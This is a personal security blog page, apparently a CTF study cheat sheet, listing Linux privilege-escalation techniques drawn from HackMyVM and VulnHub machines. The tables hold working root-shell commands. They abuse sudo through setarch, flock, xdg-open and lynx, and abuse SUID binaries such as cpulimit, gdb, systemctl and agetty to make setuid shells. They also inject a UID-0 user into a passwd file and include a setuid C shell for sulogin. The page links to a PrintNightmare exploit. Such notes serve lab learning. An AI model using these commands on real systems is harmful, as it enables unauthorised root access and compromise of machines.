<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="PrivEsc" /><meta property="og:locale" content="en" /><meta name="description" content="The below is a modification from here !" /><meta property="og:description" content="The below is a modification from here !" /><link rel="canonical" href="https://am-a-circle.github.io//privesc/" /><meta property="og:url" content="https://am-a-circle.github.io//privesc/" /><meta property="og:site_name" content="am-a-circle" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-27T10:58:06+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PrivEsc" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"PrivEsc","dateModified":"2024-09-27T10:58:06+08:00","datePublished":"2024-09-27T10:58:06+08:00","description":"The below is a modification from here !","url":"https://am-a-circle.github.io//privesc/","mainEntityOfPage":{"@type":"WebPage","@id":"https://am-a-circle.github.io//privesc/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>PrivEsc | am-a-circle</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="am-a-circle"><meta name="application-name" content="am-a-circle"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">am-a-circle</a></div><div class="site-subtitle font-italic">Logs of my roots.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item active"> <a href="/privesc/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>PRIVESC</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-a-circle" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PrivEsc</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> PrivEsc</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="page" class="post pb-5 pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4 mb-md-4"><h1 class="dynamic-title"> PrivEsc</h1><div class="post-content"><p>The below is a modification from <a href="https://github.com/Ignitetechnologies/Privilege-Escalation">here</a> !</p><p><a name="table-of-contents"></a></p><h1 id="table-of-contents-linux">Table of Contents LINUX</h1><ul><li><a href="#sudo">Abusing Sudo Rights</a><li><a href="#suid">SUID Bit</a><li><a href="#etc">Writable /etc/passwd file</a><li><a href="#pickle">Python Pickle</a><li><a href="#path">Path Variable</a><li><a href="#docker">Docker Escape</a><li><a href="#wfos">Writable files or script</a><li><a href="#ev">Environment Variable</a></ul><h1 id="table-of-contents-windows">Table of Contents WINDOWS</h1><ul><li><a href="#Service">Service</a></ul><p><a name="sudo"></a></p><h2 id="abusing-sudo-rights-">Abusing Sudo Rights <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No.<th>Machine Name<th>Reference<th>Files/Binaries<th>Description<tbody><tr><td>1.<td><a href="https://www.vulnhub.com/entry/pyexp-1,534/">PYEXP: 1</a><td><a href="https://am-a-circle.github.io/posts/PYEXP_1/">Reference</a><td>Python script<td>exec function<tr><td>2.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=BaseME">BaseME</a><td><a href="https://am-a-circle.github.io/posts/BaseME/">Reference</a><td>base64<td>base64 to read id_rsa from /root/.ssh/id_rsa<tr><td>3.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=five">five</a><td><a href="https://am-a-circle.github.io/posts/five/">Reference</a><td>man<td>man command using Pager of less function.<tr><td>4.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Forbidden">forbidden</a><td><a href="https://d4t4s3c.medium.com/hackmyvm-forbidden-4266900e6c94">EXTERNAL Reference</a><td>setarch<td>sudo setarch x86_64 /bin/sh<tr><td>5.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Vulny">Vulny</a><td><a href="https://kerszl.github.io/hacking/walkthrough/vulny/">EXTERNAL Reference</a><td>flock<td>sudo flock -u / /bin/sh<tr><td>6.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=troya">troya</a><td><a href="https://am-a-circle.github.io/posts/troya/">Reference</a><td>insmod<td><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-2-with-binary">Insert kernel as root for reverse shell</a><tr><td>7.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Echoed">Echoed</a><td>No Reference<td>xdg-open<td>1. echo ‚ÄúHackMyVM.eu‚Äù &gt; HackMyVM <br /> 2. sudo -u root /usr/bin/xdg-open /tmp/HackMyVM <br /> 3. Escape shell with after it comes out e.g. <br />WARNING: terminal is not fully functional <br />/tmp/HackMyVM (press RETURN)!/bin/sh<tr><td>8.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Attack">Attack</a><td>No Reference<td>/usr/sbin/cppw<td>openssl passwd -1 pass123 <br /> <code class="language-plaintext highlighter-rouge">$1$GLppQ1Z2$VsR0VveK9V3l0Ata6WLCr1</code> <br /> kratos@attack:/home/kratos$ cp /etc/passwd . <br /> kratos@attack:/home/kratos$ mv passwd passwd_backup <br /> kratos@attack:/home/kratos$ echo <code class="language-plaintext highlighter-rouge">"user3:$1$GLppQ1Z2$VsR0VveK9V3l0Ata6WLCr1:0:0::/root:/bin/bash"</code>¬†¬ª passwd_backup <br /> kratos@attack:/home/kratos$ sudo -u root /usr/sbin/cppw passwd_backup<tr><td>9.<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Talk">Talk</a><td>Reference<td>lynx<td>sudu -u root /usr/bin/lynx <br /> press <code class="language-plaintext highlighter-rouge">shift + 1</code> <br /> Spawning your default shell. Use ‚Äòexit‚Äô to return to Lynx. <br /> root@talk:/home/nona# whoami;id <br /> root</table></div><p><a name="suid"></a></p><h2 id="suid-bit-">SUID Bit <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No.<th>Machine Name<th>SUID Bit<th>Reference<th>Method<th>¬†<tbody><tr><td>1<td><a href="https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/">ShellDredd #1 Hannah</a><td>cpulimit<td><a href="https://am-a-circle.github.io/posts/ONSYSTEM-HANNAH/">Reference</a><td>cpulimit -l 50 -f cp /bin/bash /tmp/bash <br /> cpulimit -l 50 -f chmod +s /tmp/bash <br /> /tmp/bash -p<td>¬†<tr><td>2<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Connection">hackmyvm : connection</a><td>gdb<td><a href="https://am-a-circle.github.io/posts/connection/">Reference</a><td>gdb -nx -ex ‚Äòpython import os; os.execl(‚Äú/bin/sh‚Äù, ‚Äúsh‚Äù, ‚Äú-p‚Äù)‚Äô -ex quit<td>a<tr><td>3<td><a href="https://hackmyvm.eu/machines/machine.php?vm=soul">hackmyvm : soul</a><td>agetty<td>Reference<td>/sbin/agetty -o -p -l /bin/bash -a root tty<td>¬†<tr><td>4<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Dominator">hackmyvm :Dominator</a><td>systemctl<td>Reference<td>hans@Dominator:$ nano /tmp/temp.service <br /> hans@Dominator:$ cat /tmp/temp.service <br /> [Service] <br /> Type=oneshot <br /> ExecStart=/bin/sh -c ‚Äúcp /bin/bash /tmp/bash2 &amp;&amp; chmod u+s /tmp/bash2‚Äù <br /> [Install] <br /> WantedBy=multi-user.target <br /> hans@Dominator:$ /usr/bin/systemctl link /tmp/temp.service <br /> hans@Dominator:$ /usr/bin/systemctl enable ‚Äìnow /tmp/temp.service <br /> hans@Dominator:~$ /tmp/bash2 -p <br /> bash2-5.0# whoami <br /> root<td>¬†<tr><td>5<td><a href="https://hackmyvm.eu/machines/machine.php?vm=Locker">Locker</a><td>sulogin<td>Reference<td>Environment Variables <br /> sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root‚Äôs shell from /etc/passwd. If that fails it will fall back to /bin/sh. <br /> <br /> ‚îå‚îÄ‚îÄ(rootüíÄkali)-[/opt/hackmyv/locker] <br /> ‚îî‚îÄ# cat exp.c <br /> int main() { <br /> setuid(0); <br /> setgid(0); <br /> system(‚Äú/bin/bash -p‚Äù); <br /> } <br /> <br /> www-data@locker:/tmp$ export SUSHELL=/tmp/exp <br /> export SUSHELL=/tmp/exp <br /> <br /> www-data@locker:/tmp$ chmod 777 exp <br /> chmod 777 exp <br /> www-data@locker:/tmp$ /usr/sbin/sulogin -e <br /> /usr/sbin/sulogin -e <br /> Press Enter for maintenance <br /> (or press Control-D to continue): <br /> <br /> root@locker:~# whoami;id <br /> whoami;id <br /> root <br /> uid=0(root) gid=0(root) groups=0(root),33(www-data) <br /><td>¬†</table></div><p><a name="etc"></a></p><h2 id="writable-etcpasswd-file-">Writable /etc/passwd file <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No<th>Machine Name<tbody><tr><td>1.<td><a href="https://am-a-circle.github.io/posts/PYLINGTON_1/">PYLINGTON1</a></table></div><p><a name="wfos"></a></p><h2 id="writable-file-or-script-">Writable file or script <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No<th>Machine Name<tbody><tr><td>1.<td><a href="https://am-a-circle.github.io/posts/suidy/">suidy</a></table></div><p><a name="pickle"></a></p><h2 id="python-pickle-">Python Pickle <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No<th>Machine Name<tbody><tr><td>1.<td><a href="https://am-a-circle.github.io/posts/PHINEAS_1/">PHINEAS:1</a></table></div><p><a name="path"></a></p><h2 id="path-variable-">Path Variable <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No.<th>Machine Name<th>comments<tbody><tr><td>1.<td><a href="https://am-a-circle.github.io/posts/Hacksudo_Search/">Hacksudo:search</a><td>install: missing file operand<tr><td>2.<td><a href="https://am-a-circle.github.io/posts/Hommie/">hommie</a><td>cat: not absolute file path</table></div><p><a name="docker"></a></p><h2 id="docker-escape-">Docker Escape <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No<th>Machine Name<tbody><tr><td>1.<td><a href="https://am-a-circle.github.io/posts/pwned/">pwned</a></table></div><p><a name="ev"></a></p><h2 id="enviroment-variable-">Enviroment variable <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No.<th>Machine Name<th>comments<tbody><tr><td>1.<td><a href="https://am-a-circle.github.io/posts/icarus/">icarus</a><td>LD_PRELOAD</table></div><p><a name="Service"></a></p><h2 id="service-">Service <a href="#table-of-contents">‚§¥</a></h2><div class="table-wrapper"><table><thead><tr><th>No.<th>Machine Name<th>service exploit<tbody><tr><td>1.<td>driver<td><a href="https://github.com/calebstewart/CVE-2021-1675">spoolsv</a></table></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CarPT-Part1/">Automobile Hacking - Part 1</a><li><a href="/posts/CarPT-Part2/">Automobile Hacking - Part 2</a><li><a href="/posts/CRTP/">Attacking and Defending Active Directory Lab Course</a><li><a href="/posts/goals/">Goals</a><li><a href="/posts/speed/">Speed</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2024 <a href="https://github.com/am-a-circle">am-a-circle</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/page.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
